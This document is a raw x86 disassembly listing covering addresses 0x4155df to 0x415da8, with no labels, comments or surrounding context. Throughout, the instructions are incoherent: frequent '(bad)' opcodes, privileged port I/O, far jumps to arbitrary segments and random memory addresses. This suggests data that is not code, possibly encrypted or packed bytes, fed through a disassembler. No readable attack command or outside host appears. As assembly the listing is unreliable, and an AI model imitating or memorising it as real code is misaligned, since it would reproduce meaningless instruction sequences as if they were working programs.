  4155df:	and    dh,BYTE PTR [edx-0x73d7fb76]
  4155e5:	xchg   esi,eax
  4155e6:	add    eax,0x686bb3d
  4155eb:	push   edi
  4155ec:	jl     0x4155ab
  4155ee:	repnz mov cs,WORD PTR [esi]
  4155f1:	cvtpi2ps xmm3,QWORD PTR [edx]
  4155f4:	aad    0xf1
  4155f6:	test   ebx,eax
  4155f8:	mov    ds:0x12f719ce,al
  4155fd:	inc    esp
  4155fe:	push   eax
  4155ff:	imul   eax
  415601:	mov    edx,esi
  415603:	in     eax,dx
  415604:	(bad)  
  415605:	pusha  
  415606:	in     eax,0xb2
  415608:	adc    BYTE PTR [eax+esi*1-0x36812ec9],0x13
  415610:	(bad)  
  415612:	mov    dh,0x9a
  415614:	cmp    BYTE PTR [ebx-0x658fe6ab],al
  41561a:	xchg   ebx,eax
  41561b:	or     al,0x48
  41561d:	pop    eax
  41561e:	mov    al,ds:0x7a0ba438
  415623:	xchg   ebp,eax
  415624:	loopne 0x41561b
  415626:	loopne 0x41564e
  415628:	call   0x9378f817
  41562d:	addr16 sar bh,0x81
  415631:	sub    eax,0x83a3150d
  415636:	jnp    0x4155da
  415638:	add    bh,BYTE PTR [eax+0x54ec96f9]
  41563e:	inc    ebx
  41563f:	fcmovnu st,st(6)
  415641:	cwde   
  415642:	fwait
  415643:	add    dh,bh
  415645:	hlt    
  415646:	jmp    0xb1100a74
  41564b:	mov    al,ds:0x1c7f2c53
  415650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415651:	push   0xfffffffe
  415653:	add    DWORD PTR [ebx],0xffffff92
  415656:	retf   
  415657:	mov    dl,0x51
  415659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41565a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41565b:	sahf   
  41565c:	repnz shl DWORD PTR [edi],0x29
  415660:	(bad)  
  415661:	mov    bl,0x14
  415663:	sbb    edx,DWORD PTR [ecx+0x37ea018e]
  415669:	sbb    al,dh
  41566b:	xor    BYTE PTR [eax+0x70],ch
  41566e:	jne    0x4156ed
  415670:	sub    cl,ch
  415672:	out    0xd5,al
  415674:	jns    0x415658
  415676:	and    bl,BYTE PTR ss:[ebx-0x7c9e5814]
  41567d:	add    eax,0x48641c4a
  415682:	sub    DWORD PTR [ecx+edi*2],esp
  415685:	add    DWORD PTR [eax],edx
  415687:	sub    esi,DWORD PTR [eax]
  415689:	jb     0x415678
  41568b:	call   0x48c49380
  415690:	clc    
  415691:	xchg   esi,eax
  415692:	imul   edx,eax,0xffffffb9
  415695:	cmp    eax,0xe5e0dd87
  41569a:	sbb    eax,0xc93f52a2
  41569f:	(bad)  
  4156a0:	jmp    0x5aa705c4
  4156a5:	and    al,0x98
  4156a7:	xchg   edx,eax
  4156a8:	dec    esi
  4156a9:	rcl    BYTE PTR ds:0xb12843f6,0xca
  4156b0:	push   edx
  4156b1:	add    BYTE PTR [edx+0x4709af74],bl
  4156b7:	adc    al,0xc3
  4156b9:	push   ebx
  4156ba:	pop    ebp
  4156bb:	pop    ds
  4156bc:	adc    dh,BYTE PTR [ebx-0xb]
  4156bf:	fsubr  DWORD PTR [edi-0x4a748849]
  4156c5:	sbb    al,0x27
  4156c7:	gs push eax
  4156c9:	adc    al,BYTE PTR [edx+0x104d1e4a]
  4156cf:	out    0xfe,eax
  4156d1:	sahf   
  4156d2:	loop   0x4156b9
  4156d4:	mov    ebp,ecx
  4156d6:	xchg   ebx,eax
  4156d7:	aad    0xfd
  4156d9:	popf   
  4156da:	mov    eax,ds:0x8a2fd23c
  4156df:	xor    al,0xc5
  4156e1:	aaa    
  4156e2:	dec    edi
  4156e3:	loop   0x415762
  4156e5:	fadd   st,st(4)
  4156e7:	dec    edx
  4156e8:	call   0x91375b6d
  4156ed:	fild   DWORD PTR [edi]
  4156ef:	(bad)  
  4156f0:	mov    esp,0x6f80fbe4
  4156f5:	adc    BYTE PTR [edi+0x768a5ce4],al
  4156fb:	stos   BYTE PTR es:[edi],al
  4156fc:	stos   DWORD PTR es:[edi],eax
  4156fd:	sbb    al,0xba
  4156ff:	out    dx,eax
  415700:	hlt    
  415701:	fmul   st(1),st
  415703:	leave  
  415704:	sbb    eax,eax
  415706:	das    
  415707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415708:	data16 test BYTE PTR [edi+0x3ecb00f0],al
  41570f:	js     0x41576c
  415711:	mov    eax,ds:0x807fa6d8
  415716:	stc    
  415717:	mov    dl,0xef
  415719:	push   es
  41571a:	retf   
  41571b:	mov    ecx,DWORD PTR [eax]
  41571d:	sbb    eax,0x3e8a0c0
  415722:	jo     0x415735
  415724:	test   DWORD PTR [ecx],esi
  415726:	(bad)  
  415727:	sub    dl,BYTE PTR [ebp+0x6d]
  41572a:	(bad)  
  41572b:	outs   dx,BYTE PTR ds:[esi]
  41572c:	jecxz  0x415740
  41572e:	scas   eax,DWORD PTR es:[edi]
  41572f:	pop    esi
  415730:	jne    0x415775
  415732:	inc    esp
  415733:	dec    edi
  415734:	cld    
  415735:	jbe    0x415716
  415737:	jmp    0x7abf176b
  41573c:	sbb    BYTE PTR [ebp-0x7d],0xd4
  415740:	int3   
  415741:	sbb    BYTE PTR [edx],0x7f
  415744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415745:	mov    cl,0x28
  415747:	aas    
  415748:	ja     0x415773
  41574a:	stos   BYTE PTR es:[edi],al
  41574b:	dec    ecx
  41574c:	jl     0x415732
  41574e:	mov    dl,0x14
  415750:	out    dx,al
  415751:	mov    edx,0xca59327e
  415756:	xchg   edx,eax
  415757:	aas    
  415758:	jecxz  0x4157b5
  41575a:	jmp    0x4157d7
  41575c:	iret   
  41575d:	cld    
  41575e:	fsub   DWORD PTR [ebx+0x2011537]
  415764:	cdq    
  415765:	fisttp DWORD PTR [esi-0x4e]
  415768:	neg    bh
  41576a:	jno    0x4157aa
  41576c:	cmc    
  41576d:	and    esi,DWORD PTR [edx-0x1d]
  415770:	stc    
  415771:	mov    eax,0xd7302d54
  415776:	(bad)  
  415777:	repz sub BYTE PTR [ecx+0x2c391ccd],0x16
  41577f:	ret    
  415780:	mov    bh,0x3d
  415782:	and    BYTE PTR [ebx+0x48d63245],dl
  415788:	mov    al,ds:0xff395378
  41578d:	mov    al,0xe4
  41578f:	inc    esi
  415790:	mov    ds:0x90295bbf,eax
  415795:	lods   eax,DWORD PTR ds:[esi]
  415796:	int3   
  415797:	add    ebx,edx
  415799:	stos   BYTE PTR es:[edi],al
  41579a:	(bad)  
  41579b:	hlt    
  41579c:	or     al,bh
  41579e:	cmp    ah,BYTE PTR [eax-0x35df7910]
  4157a4:	shl    BYTE PTR [edx+edi*4-0x151c9e1e],cl
  4157ab:	call   esp
  4157ad:	sbb    al,0x62
  4157af:	out    dx,al
  4157b0:	mov    dh,0x97
  4157b2:	mov    dh,0x4f
  4157b4:	or     al,0x76
  4157b6:	mov    dh,0x24
  4157b8:	push   eax
  4157b9:	sub    eax,0xe680cca5
  4157be:	aad    0xf6
  4157c0:	stos   DWORD PTR es:[edi],eax
  4157c1:	dec    eax
  4157c2:	add    al,0x92
  4157c4:	mov    bl,0xeb
  4157c6:	enter  0x80c2,0x75
  4157ca:	add    al,0x39
  4157cc:	pop    edx
  4157cd:	xor    dl,al
  4157cf:	and    DWORD PTR [edx+0x7b2bf83],edi
  4157d5:	test   BYTE PTR ds:0x7ac569e2,dl
  4157db:	addr16 pop esi
  4157dd:	and    bh,BYTE PTR [edx+0x1e]
  4157e0:	pop    esi
  4157e1:	sub    al,BYTE PTR [ebx-0x2]
  4157e4:	dec    edi
  4157e5:	mov    dl,dh
  4157e7:	enter  0xbb45,0x52
  4157eb:	mov    dl,0x2d
  4157ed:	pop    ds
  4157ee:	push   0x72c02088
  4157f3:	inc    esi
  4157f4:	mov    edx,0xaf8e145f
  4157f9:	cmp    eax,0x72a41f89
  4157fe:	sub    cl,BYTE PTR [edx]
  415800:	adc    ebx,ebx
  415802:	mov    WORD PTR [ebp-0x31],gs
  415805:	xor    cl,BYTE PTR [edi]
  415807:	sbb    al,BYTE PTR [esi+0x1c1aa94c]
  41580d:	dec    ebx
  41580e:	pop    edx
  41580f:	and    dh,0xc6
  415812:	aam    0x83
  415814:	mov    esp,0xdedfa9e8
  415819:	shl    DWORD PTR ds:0xa804bd35,cl
  41581f:	xlat   BYTE PTR ds:[ebx]
  415820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415821:	xlat   BYTE PTR ds:[ebx]
  415822:	inc    esp
  415823:	fdivr  QWORD PTR [esi+0x7e]
  415826:	rcl    BYTE PTR ss:[eax+0x4a],cl
  41582a:	mov    ds:0x2addd3d6,al
  41582f:	inc    BYTE PTR [ebp-0x43a8e513]
  415835:	(bad)  [eax+0x77]
  415838:	pop    esp
  415839:	fcomp  DWORD PTR [eax-0x455b3868]
  41583f:	outs   dx,DWORD PTR ds:[esi]
  415840:	int3   
  415841:	or     al,ch
  415843:	xchg   edi,eax
  415844:	call   0x2132:0xc974f634
  41584b:	sub    eax,0x1f9fb933
  415850:	sbb    al,0x44
  415852:	les    ebx,FWORD PTR [ebp+0x37]
  415855:	jo     0x415833
  415857:	int3   
  415858:	fisttp WORD PTR [ebp+0x528a021f]
  41585e:	loopne 0x41580f
  415860:	sar    ebx,cl
  415862:	jge    0x4158d9
  415864:	jle    0x4158c3
  415866:	shl    DWORD PTR [ecx-0x34739c3b],cl
  41586c:	xlat   BYTE PTR ds:[ebx]
  41586d:	scas   eax,DWORD PTR es:[edi]
  41586e:	push   0xffffffe9
  415870:	inc    edx
  415871:	(bad)  
  415872:	sub    BYTE PTR [eax+0x79fa74a3],cl
  415878:	cmp    BYTE PTR [ebx-0x59],cl
  41587b:	jo     0x4158f6
  41587d:	test   BYTE PTR [edx-0x300553b],ah
  415883:	cmp    al,0x97
  415885:	pop    ecx
  415886:	ja     0x415876
  415888:	(bad)  
  415889:	in     eax,dx
  41588a:	jp     0x415813
  41588c:	divps  xmm1,xmm0
  41588f:	ins    DWORD PTR es:[edi],dx
  415890:	ss xor eax,0x55543b74
  415896:	pop    ecx
  415897:	mov    dh,0xf7
  415899:	sbb    eax,0x9edb92e4
  41589e:	push   ebp
  41589f:	fidivr WORD PTR [ebx]
  4158a1:	inc    ebx
  4158a2:	pop    ss
  4158a3:	inc    esp
  4158a4:	mov    WORD PTR [ebp-0xdc84025],gs
  4158aa:	loop   0x415889
  4158ac:	cmp    ecx,DWORD PTR [ebx+0x421bc93]
  4158b2:	xchg   esi,eax
  4158b3:	outs   dx,BYTE PTR ds:[esi]
  4158b4:	adc    BYTE PTR fs:[ecx],al
  4158b7:	push   ss
  4158b8:	(bad)  
  4158b9:	pop    eax
  4158ba:	lahf   
  4158bb:	ja     0x41588c
  4158bd:	and    esp,DWORD PTR [edx+0x22a6e92d]
  4158c3:	inc    esi
  4158c4:	in     eax,0xa1
  4158c6:	inc    ebp
  4158c7:	rol    DWORD PTR [eax+0x2],1
  4158ca:	mov    dh,dl
  4158cc:	xor    eax,0x727b35e
  4158d1:	xlat   BYTE PTR ds:[ebx]
  4158d2:	adc    eax,0x13efc696
  4158d7:	cmc    
  4158d8:	inc    esp
  4158d9:	retf   0xe3f1
  4158dc:	lds    ebx,FWORD PTR [edx-0x4271adbd]
  4158e2:	jmp    0x78b2:0xa13ec27d
  4158e9:	add    DWORD PTR [edx+0x4d2673b0],eax
  4158ef:	mov    bh,ah
  4158f1:	push   0xf01b22d4
  4158f6:	mov    dl,dl
  4158f8:	jge    0x415970
  4158fa:	mov    dh,0x79
  4158fc:	mov    BYTE PTR [edx],bl
  4158fe:	xchg   esi,eax
  4158ff:	sti    
  415900:	(bad)  
  415902:	xor    DWORD PTR [edi-0x14cdf69b],edi
  415908:	jp     0x415896
  41590a:	jle    0x4158fb
  41590c:	mov    ebx,DWORD PTR [esi+0x1ac20826]
  415912:	dec    eax
  415913:	mov    ecx,0x5147c91d
  415918:	sub    al,0x86
  41591a:	add    esp,ecx
  41591c:	fwait
  41591d:	jle    0x415994
  41591f:	xchg   edi,eax
  415920:	aam    0x4
  415922:	mov    bh,0x9
  415924:	sar    ah,1
  415926:	adc    DWORD PTR [edi+eax*2-0x54e30bba],edi
  41592d:	(bad)  
  41592e:	fistp  QWORD PTR [eax]
  415930:	pop    esi
  415931:	(bad)  
  415932:	inc    DWORD PTR [ebx-0x80]
  415935:	push   esi
  415936:	and    eax,0x141cc1ed
  41593b:	and    DWORD PTR [si+0x705],ebx
  415940:	pop    ss
  415941:	sbb    eax,0x9e5e4357
  415946:	loope  0x41591d
  415948:	or     eax,DWORD PTR [ecx+0x6fdb170]
  41594e:	xor    dh,BYTE PTR [ebx-0x2e]
  415951:	jmp    0xfaf49b20
  415956:	js     0x4158db
  415958:	addr16 jl 0x4159ac
  41595b:	addr16 dec ebp
  41595d:	jge    0x4159bf
  41595f:	or     BYTE PTR [eax],0x19
  415962:	es jbe 0x41593c
  415965:	jecxz  0x415942
  415967:	jl     0x415938
  415969:	mov    ah,0xb7
  41596b:	jns    0x4159ca
  41596d:	sahf   
  41596e:	jne    0x41598f
  415970:	inc    edi
  415971:	sbb    eax,0x11b46857
  415976:	and    edx,DWORD PTR [edx-0x22c16c9d]
  41597c:	inc    eax
  41597d:	test   al,0xf3
  41597f:	fisub  WORD PTR [ebp+ebx*4+0x4f]
  415983:	aad    0xac
  415985:	push   edx
  415986:	ins    WORD PTR es:[edi],dx
  415988:	jbe    0x4159ad
  41598a:	jns    0x41590c
  41598c:	push   esi
  41598d:	and    DWORD PTR [ecx+0x1b],esp
  415990:	test   BYTE PTR [esi+0x29],dl
  415993:	xchg   ebx,eax
  415994:	lahf   
  415995:	popf   
  415996:	inc    ebx
  415997:	xor    eax,0xe570fdf5
  41599c:	mov    ds:0x604912e9,eax
  4159a1:	pop    si
  4159a3:	or     esp,edi
  4159a5:	icebp  
  4159a6:	pop    eax
  4159a7:	xchg   DWORD PTR [edx+0x3c],esi
  4159aa:	int    0xf
  4159ac:	cdq    
  4159ad:	inc    edx
  4159ae:	nop
  4159af:	ret    
  4159b0:	(bad)  
  4159b1:	shl    BYTE PTR ds:0x5a316ffc,0xff
  4159b8:	(bad)  
  4159b9:	push   ss
  4159ba:	call   0x9914:0x51860ce8
  4159c1:	pop    edx
  4159c2:	es int3 
  4159c4:	fcmovne st,st(2)
  4159c6:	data16 or BYTE PTR [esp+edi*2+0x0],ch
  4159cb:	ss mov ?,edi
  4159ce:	paddusw mm3,mm1
  4159d1:	ins    BYTE PTR es:[edi],dx
  4159d2:	fdiv   QWORD PTR [esp+ecx*2+0x24d0f821]
  4159d9:	es and al,bh
  4159dc:	add    al,0xfb
  4159de:	aad    0xb2
  4159e0:	rol    DWORD PTR [eax+0x44e0d8df],1
  4159e6:	push   esp
  4159e7:	sub    al,0x91
  4159e9:	jb     0x415995
  4159eb:	add    ebp,edi
  4159ed:	aas    
  4159ee:	repz cmp DWORD PTR [edi],ebp
  4159f1:	sub    eax,0x3a6bcffb
  4159f6:	retf   0x6711
  4159f9:	mov    ah,0xd
  4159fb:	js     0x415a26
  4159fd:	mov    bl,0x92
  4159ff:	lods   al,BYTE PTR ds:[esi]
  415a00:	popf   
  415a01:	mov    cs,WORD PTR [edi+0x1a]
  415a04:	pushf  
  415a05:	cmp    ch,dh
  415a07:	mov    edi,0x85ed98f
  415a0c:	(bad)  
  415a0d:	stos   BYTE PTR es:[edi],al
  415a0e:	pop    ebp
  415a0f:	adc    ebp,DWORD PTR [ebx]
  415a11:	jae    0x415a3d
  415a13:	sub    cl,bl
  415a15:	xlat   BYTE PTR ds:[ebx]
  415a16:	lds    ebx,FWORD PTR [ecx-0x7c]
  415a19:	mov    ebp,0x6e35b9a1
  415a1e:	xchg   edx,eax
  415a1f:	mov    bl,0xcb
  415a21:	push   cs
  415a22:	in     eax,dx
  415a23:	pop    edx
  415a24:	lock stc 
  415a26:	adc    esi,0x15435e7b
  415a2c:	mov    bh,0x98
  415a2e:	jp     0x415a07
  415a30:	(bad)  
  415a31:	mov    dh,0xb3
  415a33:	daa    
  415a34:	xchg   edx,eax
  415a35:	in     eax,dx
  415a36:	inc    esp
  415a37:	jno    0x415a32
  415a39:	pop    eax
  415a3a:	push   edi
  415a3b:	or     bl,BYTE PTR [edi-0x4680c71d]
  415a41:	shl    bl,1
  415a43:	gs test al,0x54
  415a46:	jl     0x4159d3
  415a48:	jo     0x4159cf
  415a4a:	sub    bl,dl
  415a4c:	xor    BYTE PTR [ecx],0xc0
  415a4f:	les    esi,FWORD PTR [esi]
  415a51:	add    eax,0x44713ea9
  415a56:	je     0x415ac5
  415a58:	dec    esi
  415a59:	pop    es
  415a5a:	push   cs
  415a5b:	push   cs
  415a5c:	add    bl,BYTE PTR [edi+0x4a5782af]
  415a62:	sbb    esp,ebx
  415a64:	sbb    eax,0xb7bcc3cf
  415a69:	sbb    esp,DWORD PTR [edx-0x5a]
  415a6c:	dec    ebp
  415a6d:	mov    ah,0x6e
  415a6f:	xor    eax,0x95418a1d
  415a74:	xchg   dh,dh
  415a76:	inc    edi
  415a77:	and    eax,0x45b5e561
  415a7c:	out    dx,eax
  415a7d:	xor    edi,DWORD PTR [ecx-0x7a]
  415a80:	adc    edi,DWORD PTR [eax]
  415a82:	mov    edi,0x5f0540ec
  415a87:	xor    ecx,DWORD PTR [edi]
  415a89:	cmc    
  415a8a:	or     esp,DWORD PTR [esi+ecx*4-0x4c]
  415a8e:	mov    dh,0xc2
  415a90:	imul   edi,DWORD PTR [ebp+ebp*2+0x6d2b5ed8],0xffffffd5
  415a98:	imul   eax,DWORD PTR [ecx+0x734a22e9],0xffffffb2
  415a9f:	mov    ecx,0x868b6a46
  415aa4:	push   edx
  415aa5:	leave  
  415aa6:	mov    edx,0xfe6d15ac
  415aab:	jecxz  0x415a76
  415aad:	arpl   WORD PTR [ebx+ebp*1+0x78],si
  415ab1:	fild   QWORD PTR [ebx-0x25eaaf97]
  415ab7:	jbe    0x415a81
  415ab9:	lds    edi,FWORD PTR [eax+0xc]
  415abc:	aad    0xcb
  415abe:	cmp    dl,BYTE PTR [ecx-0x16]
  415ac1:	jmp    0x19aa0ce7
  415ac6:	loope  0x415abf
  415ac8:	(bad)  
  415ac9:	adc    bl,BYTE PTR [ebp-0x6c1975ca]
  415acf:	pusha  
  415ad0:	mov    ?,WORD PTR [ecx+0x10]
  415ad3:	outs   dx,BYTE PTR ds:[esi]
  415ad4:	icebp  
  415ad5:	mov    ebp,0xbd2d1b04
  415ada:	inc    ecx
  415adb:	and    BYTE PTR [ecx-0x63],0xfa
  415adf:	fmul   st(5),st
  415ae1:	mov    ch,0x80
  415ae3:	mov    ?,WORD PTR [di]
  415ae6:	jmp    0x527fe808
  415aeb:	mov    edi,0x7dfe751e
  415af0:	xchg   ebx,eax
  415af1:	repnz push eax
  415af3:	test   BYTE PTR ds:0x1352f128,cl
  415af9:	repz mov ds,WORD PTR [edx+0x14e79ebd]
  415b00:	fs xchg ebx,eax
  415b02:	or     esp,DWORD PTR [esi]
  415b04:	pop    esp
  415b05:	dec    esp
  415b06:	fnstcw WORD PTR [edi-0x1a]
  415b09:	jb     0x415b30
  415b0b:	add    bl,BYTE PTR [esi+0x75]
  415b0e:	sub    edi,esi
  415b10:	mov    cl,0x2b
  415b12:	retf   
  415b13:	cmp    bh,BYTE PTR [edx]
  415b15:	push   esi
  415b16:	js     0x415b27
  415b18:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415b1a:	adc    ecx,DWORD PTR [edi-0xeca8a67]
  415b20:	in     eax,0xd2
  415b22:	jno    0x415b7f
  415b24:	xor    DWORD PTR [eax-0x7894f892],ecx
  415b2a:	test   DWORD PTR [edx+0x12859281],edx
  415b30:	sub    eax,0x3bb72cbb
  415b35:	pushf  
  415b36:	test   bh,dl
  415b38:	jge    0x415adc
  415b3a:	(bad)  
  415b3b:	push   eax
  415b3c:	adc    dl,BYTE PTR [ecx+0x371d6759]
  415b42:	pop    ebx
  415b43:	jmp    0x415ace
  415b45:	pop    es
  415b46:	add    al,0xc7
  415b48:	(bad)  
  415b49:	pop    ebp
  415b4a:	test   eax,0xe2b42799
  415b4f:	pop    edi
  415b50:	adc    eax,0xbdd4b2bf
  415b55:	das    
  415b56:	sub    esp,ebx
  415b58:	test   al,0x96
  415b5a:	pop    edi
  415b5b:	xchg   DWORD PTR [ebp-0x25],esi
  415b5e:	jl     0x415ae9
  415b60:	jns    0x415b8a
  415b62:	inc    eax
  415b63:	xor    al,0xb7
  415b65:	and    DWORD PTR [edx],esi
  415b67:	mov    dl,0xe3
  415b69:	out    dx,eax
  415b6a:	cmp    dh,BYTE PTR [eax*2-0x4629448b]
  415b71:	inc    esi
  415b72:	test   eax,0x5edd8876
  415b77:	loopne 0x415b34
  415b79:	dec    edx
  415b7a:	jp     0x415b8e
  415b7c:	shr    ebp,1
  415b7e:	call   0x1d42:0xcac7da17
  415b85:	mov    ?,WORD PTR cs:[esi+0x37e725ec]
  415b8c:	mov    dh,bh
  415b8e:	and    bl,BYTE PTR [ebx-0x687ed940]
  415b94:	loope  0x415b7b
  415b96:	sub    edi,ecx
  415b98:	sub    eax,0xf7d687d6
  415b9d:	mov    esp,?
  415b9f:	sub    DWORD PTR [edx+0x1],eax
  415ba2:	push   ds
  415ba3:	mov    bl,0x9
  415ba5:	sar    DWORD PTR [edi],1
  415ba7:	jbe    0x415b68
  415ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415baa:	add    ch,BYTE PTR [ebp-0xa]
  415bad:	mov    dh,0x66
  415baf:	adc    DWORD PTR [ebp-0x50],ecx
  415bb2:	ret    0x6f39
  415bb5:	and    eax,0x110135e4
  415bba:	mov    ecx,0x3af8c74a
  415bbf:	inc    esi
  415bc0:	cmp    eax,0xb0c939f4
  415bc5:	or     esp,esp
  415bc7:	xchg   esp,eax
  415bc8:	std    
  415bc9:	mov    bl,0xcf
  415bcb:	and    eax,0xf489c36c
  415bd0:	add    BYTE PTR [edx+ecx*1],ch
  415bd3:	cs aaa 
  415bd5:	sub    al,0xc5
  415bd7:	mov    al,ds:0x4fbe3f93
  415bdc:	arpl   bp,cx
  415bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdf:	mov    ebp,0x3587f185
  415be4:	mov    ds:0xa4dcafb6,eax
  415be9:	push   esp
  415bea:	out    dx,eax
  415beb:	adc    DWORD PTR [eax],esp
  415bed:	sbb    al,0x51
  415bef:	mov    DWORD PTR [edx+ebp*4+0x50],0xeeb2237
  415bf7:	pop    ebx
  415bf8:	pop    edx
  415bf9:	pop    ecx
  415bfa:	ret    
  415bfb:	push   es
  415bfc:	js     0x415bcd
  415bfe:	jge    0x415b9c
  415c00:	xchg   DWORD PTR [edx-0x3c],edi
  415c03:	jg     0x415b9d
  415c05:	sbb    eax,0x9469d153
  415c0a:	in     eax,0xbe
  415c0c:	out    0xf2,al
  415c0e:	call   0x1663be26
  415c13:	lea    ebx,[edi+0x7f]
  415c16:	jae    0x415c41
  415c18:	jge    0x415c2b
  415c1a:	dec    ebp
  415c1b:	inc    eax
  415c1c:	and    BYTE PTR [ebx-0x54],bh
  415c1f:	pop    ds
  415c20:	out    0x7,eax
  415c22:	lahf   
  415c23:	jmp    0xd778:0xd0e5a022
  415c2a:	fst    DWORD PTR [ecx-0x1204099e]
  415c30:	iret   
  415c31:	adc    eax,DWORD PTR [eax+eax*8+0x43f3bccb]
  415c38:	(bad)  
  415c39:	cmp    esp,esi
  415c3b:	outs   dx,DWORD PTR ds:[esi]
  415c3c:	leave  
  415c3d:	and    al,0x76
  415c3f:	dec    edi
  415c40:	dec    ecx
  415c41:	inc    ebp
  415c42:	aaa    
  415c43:	ja     0x415c08
  415c45:	lahf   
  415c46:	xor    al,0x31
  415c48:	xlat   BYTE PTR ds:[ebx]
  415c49:	mov    esi,0x6d75432c
  415c4e:	push   es
  415c4f:	sub    cl,BYTE PTR [ebp-0x40460b88]
  415c55:	cli    
  415c56:	sub    DWORD PTR [esi+0x7d3b1ed4],eax
  415c5c:	jg     0x415cbb
  415c5e:	(bad)  
  415c5f:	stc    
  415c60:	aad    0xeb
  415c62:	or     al,BYTE PTR [ecx]
  415c64:	imul   esi,DWORD PTR ds:0xea1bbc35,0x6d
  415c6b:	cmp    al,BYTE PTR [ecx+0x5004123a]
  415c71:	scas   eax,DWORD PTR es:[edi]
  415c72:	jge    0x415caf
  415c74:	inc    eax
  415c75:	mov    dh,BYTE PTR [eax+0x705236a0]
  415c7b:	cs sahf 
  415c7d:	scas   eax,DWORD PTR es:[edi]
  415c7e:	scas   eax,DWORD PTR es:[edi]
  415c7f:	not    DWORD PTR [edx]
  415c81:	jb     0x415cd4
  415c83:	jp     0x415c6e
  415c85:	fadd   DWORD PTR [edx+0x73]
  415c88:	dec    ebp
  415c89:	ds push esp
  415c8b:	popf   
  415c8c:	mov    bl,0x4b
  415c8e:	sbb    al,0x80
  415c90:	test   al,0xab
  415c92:	rcl    BYTE PTR [ecx],1
  415c94:	dec    ecx
  415c95:	push   ss
  415c96:	add    al,bl
  415c98:	push   ss
  415c99:	mov    bl,0x4a
  415c9b:	int3   
  415c9c:	les    esi,FWORD PTR [esi-0x58176b72]
  415ca2:	and    al,0x37
  415ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca5:	adc    DWORD PTR [ecx-0x3c81829f],ebp
  415cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cac:	scas   al,BYTE PTR es:[edi]
  415cad:	push   ecx
  415cae:	push   0xffffffd1
  415cb0:	mov    ah,0xcd
  415cb2:	bound  edx,QWORD PTR [eax-0x77636806]
  415cb8:	outs   dx,DWORD PTR ds:[esi]
  415cb9:	and    edx,ebx
  415cbb:	add    esi,esi
  415cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbe:	inc    ebp
  415cbf:	test   al,0x82
  415cc1:	stos   BYTE PTR es:[edi],al
  415cc2:	in     eax,0xb5
  415cc4:	aad    0x87
  415cc6:	pop    ecx
  415cc7:	pop    ss
  415cc8:	lock add BYTE PTR [edx-0x1027912],dh
  415ccf:	lods   al,BYTE PTR ds:[esi]
  415cd0:	pop    edi
  415cd1:	mov    edx,0x65de9c99
  415cd6:	adc    ebp,DWORD PTR [ecx+0x3]
  415cd9:	rcr    DWORD PTR [esi+0x101bf902],1
  415cdf:	add    ecx,DWORD PTR [ecx+esi*4+0x4c86ec9e]
  415ce6:	test   eax,0x65323c3a
  415ceb:	rcr    ecx,1
  415ced:	and    ebp,DWORD PTR [ebx]
  415cef:	mov    ecx,0xea43ac6d
  415cf4:	jb     0x415d52
  415cf6:	fsubr  DWORD PTR [esi]
  415cf8:	mov    bl,0x5a
  415cfa:	xor    al,0x7c
  415cfc:	add    DWORD PTR [edi-0x51],ebx
  415cff:	pop    edi
  415d00:	lea    eax,[ecx-0x2c]
  415d03:	mov    dh,0x9c
  415d05:	sub    DWORD PTR [esi-0x9],ebp
  415d08:	push   ebp
  415d09:	pop    ebx
  415d0a:	mov    cl,0xd5
  415d0c:	(bad)  
  415d0d:	sbb    BYTE PTR [eax+ebp*2],ah
  415d10:	hlt    
  415d11:	lods   al,BYTE PTR ds:[esi]
  415d12:	push   0x7a001866
  415d17:	pop    es
  415d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d19:	push   0x83c76f4f
  415d1e:	push   ebp
  415d1f:	or     edx,DWORD PTR [esi]
  415d21:	aaa    
  415d22:	pop    es
  415d23:	push   cs
  415d24:	pop    ecx
  415d25:	repz xor eax,0x1f94f77e
  415d2b:	and    DWORD PTR [esi-0x1e],ebp
  415d2e:	jo     0x415d89
  415d30:	mov    ebp,0x2174a59f
  415d35:	jg     0x415d71
  415d37:	cmp    al,0x73
  415d39:	inc    edi
  415d3a:	xor    BYTE PTR [eax],ch
  415d3c:	ror    BYTE PTR [esi-0x5],0x5
  415d40:	jns    0x415dbc
  415d42:	jne    0x415ccb
  415d44:	out    dx,eax
  415d45:	or     DWORD PTR cs:[ebx+0x70],eax
  415d49:	push   0xffffffe4
  415d4b:	dec    esp
  415d4c:	adc    edi,DWORD PTR [ebx+0x41]
  415d4f:	lock int3 
  415d51:	xor    ebp,ecx
  415d53:	addr16 loop 0x415d37
  415d56:	pop    ds
  415d57:	jl     0x415d37
  415d59:	jp     0x415ceb
  415d5b:	in     al,0x25
  415d5d:	adc    eax,0xdd83634
  415d62:	cdq    
  415d63:	xchg   esi,eax
  415d64:	xchg   ebp,eax
  415d65:	int    0xc0
  415d67:	test   BYTE PTR [ecx+0x7445dd9f],bh
  415d6d:	xchg   esp,eax
  415d6e:	inc    ebp
  415d6f:	ret    
  415d70:	fdivr  QWORD PTR [edi+0x24]
  415d73:	clc    
  415d74:	push   edx
  415d75:	mov    ?,WORD PTR [esi]
  415d77:	jne    0x415d64
  415d79:	rcl    BYTE PTR [esi+eiz*1],1
  415d7c:	repz push 0xfd0ce3fe
  415d82:	push   esi
  415d83:	aad    0x2d
  415d85:	xor    DWORD PTR [eax-0x3e],edx
  415d88:	icebp  
  415d89:	leave  
  415d8a:	pusha  
  415d8b:	xchg   ecx,eax
  415d8c:	mov    ebx,0x9bbf83aa
  415d91:	mov    al,0xc2
  415d93:	fcomp  QWORD PTR [edi]
  415d95:	sahf   
  415d96:	mov    edx,0xc2e906e1
  415d9b:	outs   dx,BYTE PTR ds:[esi]
  415d9c:	push   edi
  415d9d:	sbb    edi,DWORD PTR [esi-0x29bb9be0]
  415da3:	ret    
  415da4:	je     0x415d99
  415da6:	mov    ch,0x3b
  415da8:	leave  
